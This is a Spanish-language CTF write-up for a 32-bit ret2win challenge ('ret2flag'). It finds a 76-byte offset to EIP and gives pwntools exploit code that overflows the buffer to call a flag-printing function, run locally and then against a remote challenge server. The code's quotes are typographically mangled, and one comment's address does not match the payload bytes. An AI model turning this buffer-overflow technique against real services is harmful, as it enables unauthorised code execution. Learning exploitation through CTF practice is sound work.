---
title: Ret2Flag-CTF-Q4SB
date: 2020-07-25 11:58:47 +07:00
---

Inicialmente nos entregan lo siguiente:

![ctf](/assets/img/1.png)

Donde nos entregan el binario ret2flag el cual procedemos a analyzar con r2.

![ret2flag](/assets/img/2.png)

Siguiendo la teoria de ret2win , debemos encontrar una función que retornar para cuando tengamos el control de EIP dentro del binario , por lo que encontramos la funcion sym.flag la cual hace lo siguiente:

![ret2flag2](/assets/img/3.png)

Donde llama la función sym.imp.system la cual de forma interna hace un cat a flag.txt. (esto lo veremos mas adelante)

Como ya tenemos la función que retornar , necesitamos saber con cuantos bytes el programa obtiene un crash para controlar EIP.

Ocupe gbd con peda para generar un pattern y obtener la cantidad de bytes necesarias.

![ret2flag3](/assets/img/4.png)

Generando un patron de 200 bytes, ejecutaremos el binario para ver donde empezamos a pisar EIP.

![ret2flag4](/assets/img/5.png)

Nos entrega que el buffer del binario son 76 bytes , entonces como ya tenemos la funcion donde debemos saltar la cual es sym.flag , solamente nos queda codear el exploit.

Codigo:

```python
#/usr/bin/python3
from pwn import *#Ejecutar binario
p=process(‘./ret2flag’)#Bytes para el crash 76
payload=”A”*76
#Direccion de la memoria de sym.flag 0x0840852d se debe entregar en little endian
payload+=”\x2d\x85\x04\x08"#Esperamos el mensaje de la ejecucion del binario para enviar el payload
p.recvuntil(‘Esta es la ultima vez en 32!’)
#Enviamos el payload
p.sendline(payload)
#Recibimos la respuest de forma interactiva
p.interactive()
```

Lo ejecutamos de forma local y obtenemos que flag.txt no existe en nuestro dispositivo.

![ret2flag5](/assets/img/6.png)

Por lo que ahora ya sabemos que funciona, lo haremos remoto solo le cambiamos la linea de donde obtiene el binario para esto de la siguiente forma.

```python
#/usr/bin/python3
from pwn import *#Ejecutar binario desde el host remoto
p=remote(‘165.227.83.238’,8888)#Bytes para el crash 76
payload=”A”*76
#Direccion de la memoria de sym.flag 0x0840852d se debe entregar en little endian
payload+=”\x2d\x85\x04\x08"#Esperamos el mensaje de la ejecucion del binario para enviar el payload
p.recvuntil(‘Esta es la ultima vez en 32!’)
#Enviamos el payload
p.sendline(payload)
```

Lo ejecutamos y obtenemos nuestra flag.

![ret2flag6](/assets/img/7.png)

Flag: Q4SB{n0_m4s_32_b1ts_si_ahor4_viene_arm}
